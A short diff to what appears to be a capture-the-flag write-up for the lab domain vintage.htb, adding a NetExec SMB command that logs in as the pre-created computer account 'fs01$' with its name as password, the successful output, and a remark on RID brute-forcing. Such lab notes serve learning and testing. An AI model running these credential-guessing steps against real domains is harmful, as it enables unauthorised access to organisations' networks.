@@ -149,5 +149,9 @@ Not a lot else i can do with SMB
 
 # Pre-created computer account
 ```python
-
+nxc smb dc01.vintage.htb -u 'fs01$' -p 'fs01' -k  
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\fs01$:fs01
 ```
+I ran nxc again with `--rid-brute` and found some machine accounts and ive attempted the user as password here and authenticated
+
